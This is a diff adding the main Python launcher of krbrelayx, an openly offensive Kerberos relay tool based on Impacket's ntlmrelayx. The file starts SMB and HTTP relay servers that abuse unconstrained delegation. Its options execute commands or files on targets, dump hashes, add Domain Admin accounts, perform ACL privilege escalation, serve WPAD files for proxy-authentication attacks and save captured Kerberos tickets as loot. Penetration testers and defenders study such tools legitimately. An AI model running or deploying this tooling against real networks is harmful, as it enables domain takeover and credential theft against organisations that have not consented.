@@ -1,0 +1,243 @@
+#!/usr/bin/env python
+####################
+#
+# Copyright (c) 2018 Dirk-jan Mollema (@_dirkjan)
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+#
+####################
+#
+# This tool is based on ntlmrelayx, part of Impacket
+# Copyright (c) 2013-2018 SecureAuth Corporation
+#
+# Impacket is provided under under a slightly modified version
+# of the Apache Software License.
+# See https://github.com/SecureAuthCorp/impacket/blob/master/LICENSE
+# for more information.
+#
+#
+# Ntlmrelayx authors:
+#  Alberto Solino (@agsolino)
+#  Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
+#
+
+import argparse
+import sys
+import binascii
+import logging
+from threading import Thread
+
+from impacket import version
+from impacket.examples import logger
+from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
+from lib.servers import SMBRelayServer, HTTPKrbRelayServer
+from lib.utils.config import KrbRelayxConfig
+from lib.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
+
+RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer )
+
+def stop_servers(threads):
+    todelete = []
+    for thread in threads:
+        if isinstance(thread, RELAY_SERVERS):
+            thread.server.shutdown()
+            todelete.append(thread)
+    # Now remove threads from the set
+    for thread in todelete:
+        threads.remove(thread)
+        del thread
+
+def main():
+    def start_servers(options, threads):
+        for server in RELAY_SERVERS:
+            #Set up config
+            c = KrbRelayxConfig()
+            c.setProtocolClients(PROTOCOL_CLIENTS)
+            c.setTargets(targetSystem)
+            c.setExeFile(options.e)
+            c.setCommand(options.c)
+            c.setEnumLocalAdmins(options.enum_local_admins)
+            c.setEncoding(codec)
+            c.setMode(mode)
+            c.setAttacks(PROTOCOL_ATTACKS)
+            c.setLootdir(options.lootdir)
+            try:
+                c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.escalate_user)
+            except TypeError:
+                # Newer version of ntlmrelayx has extra arguments
+                c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user)
+            c.setIPv6(options.ipv6)
+            c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
+            c.setSMB2Support(not options.no_smb2support)
+            c.setInterfaceIp(options.interface_ip)
+            if options.krbhexpass and not options.krbpass:
+                c.setAuthOptions(options.aesKey, options.hashes, options.dc_ip, binascii.unhexlify(options.krbhexpass), options.krbsalt, True)
+            else:
+                c.setAuthOptions(options.aesKey, options.hashes, options.dc_ip, options.krbpass, options.krbsalt, False)
+            c.setKrbOptions(options.format)
+
+            #If the redirect option is set, configure the HTTP server to redirect targets to SMB
+            if server is HTTPKrbRelayServer and options.r is not None:
+                c.setMode('REDIRECT')
+                c.setRedirectHost(options.r)
+
+            s = server(c)
+            s.start()
+            threads.add(s)
+        return c
+
+    # Init the example's logger theme
+    logger.init()
+
+    #Parse arguments
+    parser = argparse.ArgumentParser(add_help=False,
+                                     description="Kerberos \"relay\" tool. Abuses accounts with unconstrained "
+                                                  "delegation to pwn things.")
+    parser._optionals.title = "Main options"
+
+    #Main arguments
+    parser.add_argument("-h", "--help", action="help", help='show this help message and exit')
+    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-t', "--target", action='store', metavar = 'TARGET', help='Target to attack, '
+                  'since this is Kerberos, only HOSTNAMES are valid. Example: smb://server:445 If unspecified, will store tickets for later use.')
+    parser.add_argument('-tf', action='store', metavar = 'TARGETSFILE', help='File that contains targets by hostname or '
+                                                                             'full URL, one per line')
+    parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
+                                                        'automatically (only valid with -tf)')
+
+
+    # Interface address specification
+    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
+                  'bind SMB and HTTP servers',default='')
+
+    parser.add_argument('-r', action='store', metavar='SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
+    parser.add_argument('-l', '--lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot '
+                    'directory in which gathered loot (TGTs or dumps) will be stored (default: current directory).')
+    parser.add_argument('-f', '--format', default='ccache', choices=['ccache', 'kirbi'], action='store',help='Format to store tickets in. Valid: ccache (Impacket) or kirbi'
+                                                              ' (Mimikatz format) default: ccache')
+    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
+                                                       '"%s"). If errors are detected, run chcp.com at the target, '
+                                                       'map the result with '
+                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute ntlmrelayx.py '
+                                                       'again with -codec and the corresponding codec ' % sys.getdefaultencoding())
+    parser.add_argument('-no-smb2support', action="store_false", default=False, help='Disable SMB2 Support')
+
+    parser.add_argument('-wh', '--wpad-host', action='store', help='Enable serving a WPAD file for Proxy Authentication attack, '
+                                                                   'setting the proxy host to the one supplied.')
+    parser.add_argument('-wa', '--wpad-auth-num', action='store', help='Prompt for authentication N times for clients without MS16-077 installed '
+                                                                       'before serving a WPAD file.')
+    parser.add_argument('-6', '--ipv6', action='store_true', help='Listen on both IPv6 and IPv4')
+
+    # Authentication arguments
+    group = parser.add_argument_group('Kerberos Keys (of your account with unconstrained delegation)')
+    group.add_argument('-p', '--krbpass', action="store", metavar="PASSWORD", help='Account password')
+    group.add_argument('-hp', '--krbhexpass', action="store", metavar="HEXPASSWORD", help='Hex-encoded password')
+    group.add_argument('-s', '--krbsalt', action="store", metavar="USERNAME", help='Case sensitive (!) salt. Used to calculate Kerberos keys.'
+                                                                                   'Only required if specifying password instead of keys.')
+    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
+    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
+                                                                          '(128 or 256 bits)')
+    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
+                       'ommited it use the domain part (FQDN) specified in the target parameter')
+
+    #SMB arguments
+    smboptions = parser.add_argument_group("SMB attack options")
+
+    smboptions.add_argument('-e', action='store', required=False, metavar='FILE', help='File to execute on the target system. '
+                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    smboptions.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND', help='Command to execute on '
+                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
+                                                          'directory).')
+    smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempt SAMR lookup to see who is (only works pre Win 10 Anniversary)')
+
+    #LDAP options
+    ldapoptions = parser.add_argument_group("LDAP attack options")
+    ldapoptions.add_argument('--no-dump', action='store_false', required=False, help='Do not attempt to dump LDAP information')
+    ldapoptions.add_argument('--no-da', action='store_false', required=False, help='Do not attempt to add a Domain Admin')
+    ldapoptions.add_argument('--no-acl', action='store_false', required=False, help='Disable ACL attacks')
+    ldapoptions.add_argument('--no-validate-privs', action='store_false', required=False, help='Do not attempt to enumerate privileges, assume permissions are granted to escalate a user via ACL attacks')
+    ldapoptions.add_argument('--escalate-user', action='store', required=False, help='Escalate privileges of this user instead of creating a new one')
+
+    try:
+       options = parser.parse_args()
+    except Exception as e:
+       logging.error(str(e))
+       sys.exit(1)
+
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)
+
+    # Let's register the protocol clients we have
+    # ToDo: Do this better somehow
+    from lib.clients import PROTOCOL_CLIENTS
+
+
+    if options.codec is not None:
+        codec = options.codec
+    else:
+        codec = sys.getdefaultencoding()
+
+    if options.target is not None:
+        logging.info("Running in attack mode to single host")
+        mode = 'ATTACK'
+        targetSystem = TargetsProcessor(singleTarget=options.target, protocolClients=PROTOCOL_CLIENTS)
+    else:
+        if options.tf is not None:
+            #Targetfile specified
+            logging.info("Running in attack mode to hosts in targetfile")
+            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS)
+            mode = 'ATTACK'
+        else:
+            logging.info("Running in export mode (all tickets will be saved to disk)")
+            targetSystem = None
+            mode = 'EXPORT'
+
+    if options.r is not None:
+        logging.info("Running HTTP server in redirect mode")
+
+    if targetSystem is not None and options.w:
+        watchthread = TargetsFileWatcher(targetSystem)
+        watchthread.start()
+
+    threads = set()
+
+    c = start_servers(options, threads)
+
+    print ""
+    logging.info("Servers started, waiting for connections")
+    try:
+        sys.stdin.read()
+    except KeyboardInterrupt:
+        pass
+    else:
+        pass
+
+    for s in threads:
+        del s
+
+    sys.exit(0)
+
+
+
+# Process command-line arguments.
+if __name__ == '__main__':
+    main()
